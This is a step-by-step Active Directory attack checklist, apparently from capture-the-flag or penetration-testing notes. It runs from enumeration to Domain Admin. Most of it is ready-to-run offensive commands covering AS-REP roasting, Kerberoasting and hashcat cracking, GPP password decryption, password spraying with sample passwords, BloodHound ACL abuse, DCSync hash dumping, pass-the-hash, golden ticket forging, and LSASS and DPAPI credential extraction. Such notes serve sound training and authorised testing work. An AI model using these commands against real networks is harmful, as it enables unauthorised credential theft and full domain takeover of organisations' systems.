# Active Directory Chain Checklist

> Run-through-in-order from "AD detected" to Domain Admin.

## Phase 0 — confirm AD

- [ ] nmap shows ports 88 + 389 (+ 445 + 636 + 3268).
- [ ] `nmap -p389 --script ldap-rootdse` returns base DN.
- [ ] Realm captured (e.g. `htb.local`).
- [ ] `/etc/hosts` updated with DC FQDN.
- [ ] `/etc/resolv.conf` points at the DC for AD lookups (or
      `--dc-ip` used on every tool).

## Phase 1 — anonymous enumeration

- [ ] `rpcclient -U "" -N <ip>` → `srvinfo`, `enumdomusers`,
      `querydispinfo`, `getdompwinfo`, `enumdomgroups`.
- [ ] `ldapsearch -x -H ldap://<ip> -s base namingcontexts`.
- [ ] `ldapsearch ... "(objectClass=user)" sAMAccountName cn description '*' '+'`.
- [ ] `smbmap -H <ip>` and `smbclient -L //<ip>/ -N`.
- [ ] `enum4linux-ng -A <ip>` for sanity.
- [ ] `kerbrute userenum --dc <ip> -d <DOMAIN> users.txt` if other
      channels are restricted.

## Phase 2 — userlist + password policy

- [ ] Userlist saved to `users.txt`.
- [ ] Password policy known? lockout threshold?
- [ ] All `description` fields grepped for cleartext passwords?
- [ ] All custom attributes inspected (Cascade `cascadeLegacyPwd`)?

## Phase 3 — AS-REPRoasting

- [ ] `impacket-GetNPUsers <dom>/ -usersfile users.txt -no-pass -dc-ip <ip> -format hashcat -outputfile asrep.hashes`.
- [ ] `hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt -r best64.rule`.
- [ ] Cracked → cred validated with `crackmapexec smb -u <u> -p <p>`?

## Phase 4 — anonymous SMB → cred

- [ ] Replication / SYSVOL share readable?
- [ ] Recursively downloaded?
- [ ] Found `Groups.xml` / `Services.xml` / `ScheduledTasks.xml`?
- [ ] All `cpassword=` decrypted via `gpp-decrypt`?

## Phase 5 — password spraying (if no other path)

**Check lockout policy first** — `getdompwinfo` from RPC.

- [ ] Sane-spray candidates: `Welcome1!`, `<Season>2024!`, `<Company>123!`.
- [ ] `kerbrute passwordspray` (does NOT lock, uses Kerberos pre-auth).
- [ ] Crackmapexec spray with `--continue-on-success`.

## Phase 6 — authenticated enumeration (BloodHound)

- [ ] `bloodhound-python -u <u> -p '<p>' -d <dom> -ns <ip> -c All`.
- [ ] Imported into BloodHound; current user marked **Owned**.
- [ ] Run "Find Shortest Paths to Domain Admins".
- [ ] Run "Find Principals with DCSync Rights".
- [ ] Run "Find Computers where Domain Users are Local Admin".
- [ ] Re-collect after every cred upgrade.

## Phase 7 — Kerberoasting

- [ ] `impacket-GetUserSPNs <dom>/<u>:<p> -dc-ip <ip>` to list SPNs.
- [ ] Privileged accounts with SPN identified?
- [ ] `impacket-GetUserSPNs ... -request -outputfile kerberoast.hashes -format hashcat`.
- [ ] `hashcat -m 13100 kerberoast.hashes rockyou.txt -r best64.rule`.

## Phase 8 — ACL exploitation

- [ ] BloodHound edge → mapped abuse:
  - `WriteDACL` on domain → `dacledit` grant DCSync.
  - `WriteOwner` → take ownership → WriteDACL.
  - `GenericAll` on user → reset password.
  - `GenericAll` on group → addmember.
  - `GenericWrite` on user → addspn → targeted Kerberoast.
  - `GenericWrite` on machine → RBCD attack.
  - `ForceChangePassword` → reset password.

## Phase 9 — DCSync

- [ ] `impacket-secretsdump <dom>/<u>:<p>@<dc> -just-dc`.
- [ ] Captured `Administrator`, `krbtgt`, all service accounts.

## Phase 10 — Pass-the-Hash / Pass-the-Ticket

- [ ] `evil-winrm -i <dc> -u Administrator -H <NTLM>`.
- [ ] `impacket-psexec -hashes :<NTLM> Administrator@<dc>`.
- [ ] CME sweep with `-H <NTLM>` to enumerate cross-host PtH coverage.

## Phase 11 — Golden Ticket / Silver Ticket (engagement only)

- [ ] krbtgt NTLM captured.
- [ ] Domain SID captured.
- [ ] `impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain <dom> Administrator`.
- [ ] `KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass Administrator@<dc>`.

## Phase 12 — post-DA enumeration

- [ ] Full domain dump (every account hash).
- [ ] LSASS dumps from member servers via PtH.
- [ ] Trust enumeration (`Get-DomainTrust`, BloodHound).
- [ ] DPAPI offline decryption with mimikatz.

## Common gotchas

- [ ] System clock within 5 min of DC? (`sudo ntpdate <dc>`).
- [ ] DNS resolves DC FQDN?
- [ ] Realm casing matches (UPPERCASE)?
- [ ] Domain prefix in user spec (`<DOMAIN>/<user>`)?

## Related

- [`active-directory/anonymous-ad-enumeration.md`](../active-directory/anonymous-ad-enumeration.md)
- [`active-directory/as-rep-roasting.md`](../active-directory/as-rep-roasting.md)
- [`active-directory/kerberoasting.md`](../active-directory/kerberoasting.md)
- [`active-directory/bloodhound-usage.md`](../active-directory/bloodhound-usage.md)
- [`active-directory/dcsync.md`](../active-directory/dcsync.md)
- [`active-directory/writedacl-abuse.md`](../active-directory/writedacl-abuse.md)
- [`methodology/07-ad-attack-chains.md`](../methodology/07-ad-attack-chains.md)
